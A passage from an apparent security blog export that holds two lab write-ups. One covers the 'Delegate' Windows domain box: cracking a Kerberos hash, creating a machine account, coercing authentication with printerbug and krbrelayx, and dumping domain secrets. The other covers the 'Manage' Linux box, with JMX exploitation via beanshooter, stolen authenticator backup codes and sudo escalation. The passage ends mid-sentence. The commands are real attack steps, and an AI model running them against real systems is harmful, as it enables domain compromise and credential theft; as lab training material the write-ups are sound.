you.</p>\n<p>Let’s now use <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">hashcat</a> with a hash-identifier of 13100 to attempt to decrypt this hash.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 13100 nthompson.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">f81d26ea14e743da90803146fc62ee86195ff78c872e0422bfb05fcb74c9ec6337b612aaa6338382da5ee166bffe0d275685ab7388b9ec9b2f6cd7e7f190edb308d9f:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br></pre></td></tr></table></figure>\n\n<p>As you can see from the above, the password was cracked successfully. We can now use this with crackmapexec to see if <code>N.Thompson</code> has any valid authentication to any other resources.</p>\n<p><img src=\"/images/vulnlab/delegate-vl/c.png\"></p>\n<p>It seems as though <code>N.Thompson</code> is a part of the <code>Remote Management Users</code> group. From my first guess, this means that they can PSRemote into the machine (meaning they have RDP access).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm 10.10.87.35 -u &#x27;N.Thompson&#x27; -p &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.87.35     5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)</span><br><span class=\"line\">HTTP        10.10.87.35     5985   DC1              [*] http://10.10.87.35:5985/wsman</span><br><span class=\"line\">WINRM       10.10.87.35     5985   DC1              [+] delegate.vl\\N.Thompson:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though we have the ability to WinRM into the machine. Let’s do so with <code>evil-winrm</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.87.35 -u &#x27;N.Thompson&#x27; -p &#x27;(N.THOMPSON PASSWORD)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\"></span><br><span class=\"line\">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine               </span><br><span class=\"line\">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class=\"line\"></span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; whoami</span><br><span class=\"line\">delegate\\n.thompson</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; hostname</span><br><span class=\"line\">DC1</span><br></pre></td></tr></table></figure>\n\n<p>The first user flag is within their home directory, denoted path as <code>C:\\Users\\N.Thompson\\Desktop\\user.txt</code>.</p>\n<h1 id=\"SeEnableDelegationPrivilege-and-MAQs\"><a href=\"#SeEnableDelegationPrivilege-and-MAQs\" class=\"headerlink\" title=\"SeEnableDelegationPrivilege and MAQs\"></a>SeEnableDelegationPrivilege and MAQs</h1><p>I decided not to use Sliver for this, as it really isn’t needed aside from transferring files to the machine easily. We’ll be doing the rest of this solely from the WinRM session that we have.</p>\n<p>If you run <code>whoami /priv</code>, you’ll notice an interesting privilege that has been enabled for <code>N.Thompson</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                                                    State</span><br><span class=\"line\">============================= ============================================================== =======</span><br><span class=\"line\">SeMachineAccountPrivilege     Add workstations to domain                                     Enabled</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled</span><br><span class=\"line\">SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled</span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though they have <code>SeEnableDelegationPrivilege</code>, which is a new privilege that I have not encountered before. This specific privilege allows us to enable the trusted asset for computer and user accounts.</p>\n<p>You can find documentation on this privilege <a href=\"https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html\">here</a>. Essentially, this privilege allows our user to impersonate other accounts or computers. The interesting thing about this privilege is that we can essentially set delegation properties to be configured on behalf of user and computer objects, hence the ability for us to <code>Enable</code> delegation.</p>\n<p>Another interesting part about this is the fact that we can do this for computer accounts as well. While we don’t have access to any machine accounts currently, our current user does have a property that isn’t normally enabled to user accounts. That specific property is our MAQ, or <code>MachineAccountQuota</code>. This specific property allows us to create computer accounts within the context of our current users permissions.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.87.35 -u &#x27;N.Thompson&#x27; -p &#x27;[...snip...]&#x27; -M maq</span><br><span class=\"line\">SMB         10.10.87.35     445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.87.35     389    DC1              [+] delegate.vl\\N.Thompson:[...snip...]</span><br><span class=\"line\">MAQ         10.10.87.35     389    DC1              [*] Getting the MachineAccountQuota</span><br><span class=\"line\">MAQ         10.10.87.35     389    DC1              MachineAccountQuota: 10</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, it seems as though <code>N.Thompson</code> has a MAQ of 10. In order to add computer accounts to the domain, a minimum MAQ of 1 is required.</p>\n<h1 id=\"Exploiting-Unconstrained-Delegation\"><a href=\"#Exploiting-Unconstrained-Delegation\" class=\"headerlink\" title=\"Exploiting Unconstrained Delegation\"></a>Exploiting Unconstrained Delegation</h1><p>At this point, the attack path becomes relatively clear. What we’ll need to do is perform <a href=\"https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/\">Unconstrained Delegation</a>:</p>\n<ul>\n<li>Create a computer account and add its DNS entry to <code>EXAMPLE.delegate.vl</code> to point to our attacker machine.</li>\n<li>Use <code>krbrelayx</code> to listen for incoming Kerberos keys and cache them accordingly.</li>\n<li>Coerce an authentication attempt from the DC and capture the authentication request with <code>krbrelayx</code>. (We can use <code>printerbug</code> for this)</li>\n<li>Use the captured DC service ticket to dump the domain secrets.</li>\n</ul>\n<p>I found reference on how to do this locally from our Kali machine <a href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained\">here</a>. While I had given it a try to use <code>addcomputer</code> in Impacket’s library to do this, the issue is that it does not add the sufficient SPNs that you need on the machine account to perform unconstrained delegation. The only SPN that you have the ability to add with <code>addcomputer</code> is <code>HTTP/(account).delegate.vl</code>.</p>\n<p>The list of the required SPNs is below. I used <a href=\"https://github.com/Kevin-Robertson/Powermad\">Powermad</a> to get the specific attributes of a machine account I had configured.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">HTTP/dazzad.delegate.vl</span><br><span class=\"line\">RestrictedKrbHost/dazzad</span><br><span class=\"line\">HOST/dazzad</span><br><span class=\"line\">RestrictedKrbHost/dazzad.delegate.vl</span><br><span class=\"line\">HOST/dazzad.delegate.vl</span><br></pre></td></tr></table></figure>\n\n<p>Luckily enough, when you add a machine account via Powermad, it should add these SPNs for you. There is also an additional SPN identifier that we’ll need to have to ensure that the delegation rights are set correctly on the account.</p>\n<p>Let’s first start by creating the computer account through WinRM.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; New-MachineAccount -MachineAccount dazzad -Password $(ConvertTo-SecureString &#x27;DazPassword123@&#x27; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>\n\n<p>Next, we’ll add the SPNs to the machine account so that it can properly exploit the delegation.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; Set-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Value HTTP/dazzad.delegate.vl -Append</span><br><span class=\"line\">[+] Machine account dazzad attribute ServicePrincipalName appended</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; Set-MachineAccountAttribute -MachineAccount dazzad -Attribute userAccountControl -Value 528384</span><br><span class=\"line\">[+] Machine account daz attribute userAccountControl updated</span><br></pre></td></tr></table></figure>\n\n<p>We can verify our changes to the machine account by running <code>Get-MachineAccountAttribute</code> against the machine account we created.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\N.Thompson\\Documents&gt; Get-MachineAccountAttribute -MachineAccount dazzad -Attribute ServicePrincipalName -Verbose</span><br><span class=\"line\">Verbose: [+] Domain Controller = DC1.delegate.vl</span><br><span class=\"line\">Verbose: [+] Domain = delegate.vl</span><br><span class=\"line\">Verbose: [+] Distinguished Name = CN=dazzad,CN=Computers,DC=delegate,DC=vl</span><br><span class=\"line\">HTTP/dazzad.delegate.vl</span><br><span class=\"line\">RestrictedKrbHost/dazzad</span><br><span class=\"line\">HOST/dazzad</span><br><span class=\"line\">RestrictedKrbHost/dazzad.delegate.vl</span><br><span class=\"line\">HOST/dazzad.delegate.vl</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the respective SPNs set for this exploit, we can move back to our Kali machine for the rest of the exploit.</p>\n<p>We’ll need to add the LDAP record to <code>delegate.vl</code> to ensure that when we force it to authenticate to our machine account, it will redirect back to our MITM <code>krbrelayx</code> handler.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 krbrelayx/dnstool.py -u &#x27;delegate.vl\\dazzad$&#x27; -p &#x27;DazPassword123@&#x27; -r DAZZAD.delegate.vl -d (KALI IP) --action add -dns-ip 10.10.92.191 dc1.delegate.vl                        </span><br><span class=\"line\">[-] Connecting to host...</span><br><span class=\"line\">[-] Binding to host</span><br><span class=\"line\">[+] Bind OK</span><br><span class=\"line\">[-] Adding new record</span><br><span class=\"line\">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure>\n\n<p>Now that all of that is set, we can start our <code>krbrelayx</code> listener to listen for incoming requests.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 krbrelayx/krbrelayx.py --krbsalt &#x27;DELEGATE\\DAZ$&#x27; --krbpass &#x27;DazPassword123@&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then use <code>printerbug</code> to exploit the authentication coercion. This should force the DC to authenticate to our machine account, meaning the Kerberos TGT used to access our fake machine will be cached during the authentication exchange.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 krbrelayx/printerbug.py delegate.vl/&#x27;DAZ$&#x27;:&#x27;DazPassword123@&#x27;@dc1.delegate.vl DAZZAD.delegate.vl</span><br><span class=\"line\">[*] Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Attempting to trigger authentication via rprn RPC at dc1.delegate.vl</span><br><span class=\"line\">[*] Bind OK</span><br><span class=\"line\">[*] Got handle</span><br><span class=\"line\">DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class=\"line\">[*] Triggered RPC backconnect, this may or may not have worked</span><br></pre></td></tr></table></figure>\n\n<p>While we do get an <code>access_denied</code> error, if you look back at our <code>krbrelayx</code> listener - it should have received the authentication attempt and cached the DC’s service ticket in a <code>.ccache</code> file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*] Setting up DNS Server</span><br><span class=\"line\">[*] Servers started, waiting for connections</span><br><span class=\"line\">[*] SMBD: Received connection from 10.10.92.191</span><br><span class=\"line\">[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]</span><br><span class=\"line\">[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the service ticket for the DC, we can import this into our Kerberos authentication global variable to dump the respective secrets. I opted to rename the ticket file just so that the special characters don’t interfere with the global variable’s interpretation of the file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cp &#x27;DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache&#x27; dc.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ export KRB5CCNAME=dc.ccache</span><br></pre></td></tr></table></figure>\n\n<p>We can now dump the secrets of the DC with our ticket using <code>secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-secretsdump -k dc1.delegate.vl</span><br><span class=\"line\">......</span><br><span class=\"line\">[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user</span><br><span class=\"line\">[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)</span><br><span class=\"line\">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:[...snip...]:::</span><br></pre></td></tr></table></figure>\n\n<p>If you have done all of the required steps, you should have the NT hash for the Administrator user. We can now use this to login to DC via WinRM.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec winrm 10.10.92.191 -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\">SMB         10.10.92.191    5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)</span><br><span class=\"line\">HTTP        10.10.92.191    5985   DC1              [*] http://10.10.92.191:5985/wsman</span><br><span class=\"line\">WINRM       10.10.92.191    5985   DC1              [+] delegate.vl\\Administrator:[...snip...] (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.92.191 -u &#x27;Administrator&#x27; -H &#x27;[...snip...]&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">Evil-WinRM shell v3.5</span><br><span class=\"line\"> </span><br><span class=\"line\">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                        </span><br><span class=\"line\">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class=\"line\"></span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cat ..\\Desktop\\root.txt</span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have read the root flag and have access via WinRM as the Administrator user, we have successfully completed this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine specifically was difficult (for priv esc) as it involved exploiting unconstrained delegation REMOTELY. I’ve only exploited unconstrained delegation between machines, to which one of them I had access as SYSTEM. This was something new to learn, and the <code>MachineAccountQuota</code> attribute is something that is definitely helpful as part of the exploit process.</p>\n<p>Big thanks to <code>geiseric</code> for creating this machine.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/ShutdownRepo/targetedKerberoast\">https://github.com/ShutdownRepo/targetedKerberoast</a><br><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html\">https://www.elastic.co/guide/en/security/current/sensitive-privilege-seenabledelegationprivilege-assigned-to-a-user.html</a><br><a href=\"https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/\">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a><br><a href=\"https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html\">https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html</a><br><a href=\"https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained\">https://www.thehacker.recipes/ad/movement/kerberos/delegations/unconstrained</a><br><a href=\"https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota\">https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota</a><br><a href=\"https://github.com/Kevin-Robertson/Powermad\">https://github.com/Kevin-Robertson/Powermad</a></p>\n"},{"title":"Manage - Vulnlab","date":"2024-07-03T23:54:31.000Z","keywords":"Vulnlab, Easy, Linux","description":"Manage is one of the latest machines created by fume and xct, and it involves enumerating and exploiting a Java MBeans application that is tied to Apache Tomcat. Privilege escalation then involves general binary exploitation with sudo privileges.","cover":"/images/vulnlab/manage-vl/manage_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nManage is one of the latest machines created by fume and xct, and it involves enumerating and exploiting a Java MBeans application that is tied to Apache Tomcat. Privilege escalation then involves general binary exploitation with sudo privileges.\n\n# Enumeration\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 16:19 EDT\nNmap scan report for 10.10.89.27\nHost is up (0.11s latency).\nNot shown: 997 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n2222/tcp open  EtherNetIP-1\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 4.00 seconds\n```\n\nAs we can see, it seems as though there are three ports open - SSH, a web-server behind a proxy, and finally a new service that I haven't seen before on port 8080.\n\nAssuming that we don't have access to SSH immediately, I went to the web server on port 8080 to see if there was anything we could access.\n\n![](/images/vulnlab/manage-vl/b.png)\n\nIt seems to be a relatively generic Apache Tomcat server, with the specific version of Tomcat being 10.1.19. \n\nI researched a bit into the Tomcat version, and there doesn't seem to be much to exploit for this specific instance. I also made sure to enumerate the directories, however there doesn't seem to be much that we can access from this specific web server.\n\n# Java RMI/RMX\n\nThis lead me to research into what the third port that we have, port 2222. I found that doing a bit of continued enumeration with NMAP allowed us to discover the actual service on this port.\n\n```\n└─$ sudo nmap -A -p2222 10.10.89.27\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 16:36 EDT\nNmap scan report for 10.10.89.27\nHost is up (0.11s latency).\n\nPORT     STATE SERVICE  VERSION\n2222/tcp open  java-rmi Java RMI\n| rmi-dumpregistry: \n|   jmxrmi\n|     javax.management.remote.rmi.RMIServerImpl_Stub\n|     @127.0.1.1:32877\n|     extends\n|       java.rmi.server.RemoteStub\n|       extends\n|_        java.rmi.server.RemoteObject\n|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)\n```\n\nThe service seems to be [Java RMI](https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/index.html), the Java Remote Method Invocation API. This API allows the developer to create Java-based technology and connect it with Java-based applications. This allows the developer to invoke Java objects on other Java machines within the application environment, and also serialize user objects by supporting object-oriented polymorphism.\n\nIn much simpler terms, this allows developers to invoke a pre-created Java method onto an object that is from another address space. This space can live on either the same machine or another machine that has access to the RMI space.\n\nRemote machines can invoke methods on a the JVM (Java Virtual Machine) whether that be on the same machine (client-side) or on another machine as described previously (sever-side). RMI will automatically create a public server so that these client and server-side communications can be invoked with simple method calls.\n\nYou'll also notice that there seems to be a JMX instance tied to this RMI functionality. JMX is the Java Management Extensions framework that allows for easy and reliable configuration of a Java application whether that be remotely or locally. This introduces the concept of MBeans, which is a managed java object that follows patterns set by the JMX application.\n\nA JMX architecture can consist of the following (credit goes to [Baeldung](https://www.baeldung.com/java-management-extensions)):\n\n1. **Instrumentation Layer:** MBeans registered with the JMX agent through which resources are managed.\n2. **JMX Agent Layer:** the core component (MBeanServer) which maintains registry of managed MBeans and provides an interface to access them.\n3. **Remote Management Layer:** usually client side tool like JConsole.\n\nWrapping this all together, a developer can manage MBeans objects within a JMX application and integrate them into a JMI application through either client or server-side communication integration.\n\nSince this allows for a client on a remote virtual machine to interact with the JMI/JMX instance, we have the potential to exploit this for either enumeration or remote code execution.\n\n# Attacking JMX with Beanshooter\n\nSince I'm not the most prominent Java developer in the slightest, I decided to do some research on JMX tools online that could do enumeration for us. After a bit of time, I came across [beanshooter](https://github.com/qtc-de/beanshooter) by qtc.\n\nBeanshooter is an RMX enumeration and attacking tool that helps identify vulnerabilities in JMX applications. With this tool, we can enumerate the JMX environment by utilizing Java object invocation on certain methods in the application.\n\nThe GitHub repository listed has the basic installation for the utility, though you'll need to make sure you have both Maven and a linked JDK installation. Your java version that is installed by default should already link itself to maven automatically, though this [resource](https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu) seemed to help me when I was troubleshooting initially.\n\n```\n└─$ mvn --version\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nApache Maven 3.8.7\nMaven home: /usr/share/maven\nJava version: 17.0.11, vendor: Debian, runtime: /usr/lib/jvm/java-17-openjdk-amd64\nDefault locale: en, platform encoding: UTF-8\n```\n\nYou can then compile the beanshooter repository by executing `mvn package` within the root directory of the GitHub repo. \n\nThis should build the Java binary within `/target`.\n\n```\n-rw-rw-r--  1 daz daz 4584431 Jul  2 16:57 beanshooter-4.1.0-jar-with-dependencies.jar\n```\n\nYou can then execute this binary by running it against the `java` command-line tool.\n\n```\n└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar -h                          \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nusage: beanshooter [-h]   ...\n\nbeanshooter v4.1.0 - a JMX enumeration and attacking tool\n......\n```\n\nNow that we have the utility downloaded, let's enumerate the target environment. You can do so by using the `enum` argument parameter which will enumerate the target server for common JMX vulnerabilities. There aren't any positional arguments that we need aside from the host and port of the target server.\n\n```\n└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.89.27 2222\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[+] Checking available bound names:\n[+]\n[+]     * jmxrmi (JMX endpoint: 127.0.1.1:32877)\n[+]\n[+] Checking for unauthorized access:\n[+]\n[+]     - Remote MBean server does not require authentication.\n[+]       Vulnerability Status: Vulnerable\n......\n[+] Enumerating tomcat users:\n[+]\n[+]     - Listing 2 tomcat users:\n[+]\n[+]             ----------------------------------------\n[+]             Username:  manager\n[+]             Password:  [...snip...]\n[+]             Roles:\n[+]                        Users:type=Role,rolename=\"manage-gui\",database=UserDatabase\n[+]\n[+]             ----------------------------------------\n[+]             Username:  admin\n[+]             Password:  [...snip...]\n[+]             Roles:\n[+]                        Users:type=Role,rolename=\"role1\",database=UserDatabase\n```\n\nAs you can see, the enumeration functionality was able to verify a common vulnerability within this specific JMX server. It seems as though in our scenario, the JMX service does not require authentication.\n\nIt also was able to successfully enumerate two tomcat users, `manager` and `admin`, along with their plaintext passwords. Should we have needed to brute-force the application to check for weak passwords, we could use `beanshooter`'s `brute` functionality.\n\nNow that we have credentials to the JMX application, we can simply call a standard shell invocation using `beanshooter`'s `standard` functionality.\n\n```\n└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.89.27 2222 tonka\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[+] Creating a TemplateImpl payload object to abuse StandardMBean\n[+]\n[+]     Deplyoing MBean: StandardMBean\n[+]     MBean with object name de.qtc.beanshooter:standard=5272461178416 was successfully deployed.\n```\n\nAs you can see, an MBean object that abuses the `StandardMBean` method was deployed on the target webserver. We can call this tonka object by calling it directly from our client-side session to create a command-line session.\n\n```\n└─$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.10.89.27 2222 \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n[tomcat@10.10.89.27 /]$ whoami\ntomcat\n[tomcat@10.10.89.27 /]$ \n```\n\nAs you can see, a command-line session was generated as the `tomcat` user. I stood up a Sliver C2 session at this point, just to get a proper shell since I noticed I couldn't execute some commands (that you'll see us do later) for basic Bash usage, like `su` or `sudo`.\n\n![](/images/vulnlab/manage-vl/c.png)\n\n# Pivoting via Google Authenticator\n\nDoing a bit of a enumeration onto the internal filesystem seems to show us that there are two users in the `/home` directory.\n\n```\ntomcat@manage:/tmp$ ls /home\nkarl  useradmin\ntomcat@manage:/tmp$ ls -la /home\ntotal 16\ndrwxr-xr-x  4 root      root      4096 Jun 21 15:46 .\ndrwxr-xr-x 19 root      root      4096 Mar  1 04:20 ..\ndrwxr-xr-x  3 karl      karl      4096 Jun 21 16:51 karl\ndrwxr-xr-x  5 useradmin useradmin 4096 Jun 21 16:51 useradmin\n```\n\nGiven that we have two usernames and passwords from our enumeration of the JMX environment earlier, I decided to see if either of these users had the same password associated with their account. While I didn't get a direct match immediately, I did notice that a new prompt appeared for the local `useradmin` user when entering in the JMX `admin` user's password from before.\n\n```\n[+]             Username:  admin\n[+]             Password:  [...snip...]\n```\n\n![](/images/vulnlab/manage-vl/d.png)\n\nIt seems that the `useradmin`'s password is the same as the `admin` user that we saw from before. It didn't give us an authentication error message and instead prompted us to enter in a verification code.\n\nI've tested using Linux authentication tied to secondary authentication/MFA, so I know there must be some form of authentication tied to the `useradmin`'s user. I'm more familiar with using Google authenticator for this, so I decided to do a recursive search for any Google authenticator files on the filesystem.\n\n```\ntomcat@manage:/tmp$ find / -name *google* 2>/dev/null\n......\n/home/useradmin/.google_authenticator\n......\n```\n\nI found an odd file denoted as `.google_authenticator` within the home directory for `useradmin`. I wouldn't expect for us to be able to access this, however I noticed that `useradmin` did not have restricted access for the everyone group on the filesystem - meaning we could access their home directory.\n\nUpon trying to access their file, we can see that we don't have access to it. We do however have read access to the `backups` directory within their home folder.\n\n```\ntomcat@manage:/home/useradmin/backups$ ls -la\ntotal 12\ndrwxrwxr-x 2 useradmin useradmin 4096 Jun 21 16:51 .\ndrwxr-xr-x 5 useradmin useradmin 4096 Jul  3 22:59 ..\n-rw-rw-r-- 1 useradmin useradmin 3088 Jun 21 16:50 backup.tar.gz\n```\n\nIt seems that a tar/gzip archive exists in this backups directory. I pulled this to my local machine by downloading it through Sliver, and unzipped the archive to see its contents.\n\n```\n└─$ tar -xzf backup.tar.gz \n\n└─$ ls -la          \ntotal 36\ndrwxr-xr-x 4 daz daz 4096 Jun 21 12:48 .\ndrwxr-xr-x 8 daz daz 4096 Jul  3 16:17 ..\nlrwxrwxrwx 1 daz daz    9 Jun 21 11:48 .bash_history -> /dev/null\n-rw-r--r-- 1 daz daz  220 Jun 21 11:46 .bash_logout\n-rw-r--r-- 1 daz daz 3771 Jun 21 11:46 .bashrc\ndrwx------ 2 daz daz 4096 Jun 21 12:48 .cache\n-r-------- 1 daz daz  200 Jun 21 12:48 .google_authenticator\n-rw-r--r-- 1 daz daz  807 Jun 21 11:46 .profile\ndrwxrwxr-x 2 daz daz 4096 Jun 21 11:53 .ssh\n-rw-rw-r-- 1 daz daz 3088 Jul  3 19:08 backup.tar.gz\n```\n\nIt seems that a similar `.google_authenticator` file was decompressed from the archive. If we read this file, we can see that there are a plethora of verification codes that are within this file.\n\n```\n└─$ cat .google_authenticator \nCLSSSMHYGLENX5HAIFBQ6L35UM\n\" RATE_LIMIT 3 30 1718988529\n\" WINDOW_SIZE 3\n\" DISALLOW_REUSE 57299617\n\" TOTP_AUTH\n[...snip...]\n```\n\nBased on the `RATE_LIMIT`, my guess is that we can only use these backup verification codes three times every 30 minutes or they refresh every 30 minutes.\n\nIf we attempt to log in as `useradmin` with their password and one of these verification codes (I used 99852083), we can see that the codes seem to work and we are able to login as `useradmin`.\n\n```\ntomcat@manage:/home/useradmin/backups$ su useradmin\nPassword: \nVerification code: \nuseradmin@manage:~/backups$\n```\n\nI made sure to execute my Sliver binary again so we aren't required to use another token for a login attempt.\n\n# Privilege Escalation via Admin Group\n\nUpon getting access to `useradmin`, I immediately ran `sudo -l` to see if we had sudo access to any binaries on the filesystem.\n\n```\ntomcat@manage:/home/useradmin/backups$ su useradmin\nPassword: \nVerification code: \nuseradmin@manage:~/backups$ sudo -l\nMatching Defaults entries for useradmin on manage:\n    env_reset, timestamp_timeout=1440, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser useradmin may run the following commands on manage:\n    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$\n```\n\nWe seem to have sudo access to `/usr/sbin/adduser`, though you'll notice that a string of text is following the command.\n\nI did some research into specifically what this meant, and it seems to be a string of characters followed by regular expression variables that limit the extent of the command.\n\n* `^` indicates that the start of a line.\n* `[a-zA-Z0-9]` indicates any set of alphanumeric characters.\n* `+` means that we can add an unlimited amount of characters, given that they fall under the prerequisites of the previous regex statement (alphanumeric).\n* `$` indicates the end of the line.\n\nThis essentially means that we only have the ability to enter in a string for `adduser`, limiting what we essentially are able to do.\n\nThe `/usr/sbin/adduser` binary seems to just be adding a user. The interesting part is that a `--system` function exists in that binary which seems to allow us to add a system privileged (root-level) user. The only issue is 